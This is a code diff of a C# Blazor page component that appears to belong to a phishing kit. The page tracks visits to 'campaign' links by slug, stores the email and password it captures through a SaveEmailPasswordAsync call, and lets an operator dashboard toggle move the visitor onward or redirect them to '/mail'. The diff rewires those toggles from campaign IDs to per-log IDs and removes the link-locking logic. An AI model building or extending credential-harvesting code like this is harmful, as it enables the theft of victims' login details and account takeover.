@@ -356,7 +356,7 @@ else
     {
         if (!firstRender) return;
 
-        AppState.OnCampaignToggled += HandleCampaignToggled;
+        AppState.OnLogToggled += HandleLogToggled;
 
         var slug = ResolveSlug();
         if (!string.IsNullOrWhiteSpace(slug))
@@ -366,22 +366,14 @@ else
             {
                 _campaignLinkId = link.Id;
                 await CampaignService.MarkVisitedAsync(link.Id);
-                AppState.NotifyLogsChanged();
-                if (link.IsLocked)
-                {
-                    if (link.PageMode == 3)
-                        Nav.NavigateTo("/mail", forceLoad: true);
-                    else
-                        _step = 6;
-                }
                 StateHasChanged();
             }
         }
     }
 
-    private void HandleCampaignToggled(int campaignId, int pageMode)
+    private void HandleLogToggled(int logId, int pageMode)
     {
-        if (_campaignLinkId != campaignId) return;
+        if (_currentLogId != logId) return;
         InvokeAsync(() =>
         {
             if (pageMode == 3)
@@ -456,12 +448,7 @@ else
         _currentLogId = await LogService.SaveEmailPasswordAsync(_email, _password, _campaignLinkId);
 
         if (_campaignLinkId.HasValue)
-        {
-            await CampaignService.LockAsync(_campaignLinkId.Value);
-            // Notify AFTER lock so dashboard re-renders with IsLocked=true and shows the toggle
-            AppState.NotifyLogsChanged();
             _step = 5;
-        }
         else
         {
             _step = 3;
@@ -486,5 +473,5 @@ else
     }
 
     public void Dispose()
-        => AppState.OnCampaignToggled -= HandleCampaignToggled;
+        => AppState.OnLogToggled -= HandleLogToggled;
 }
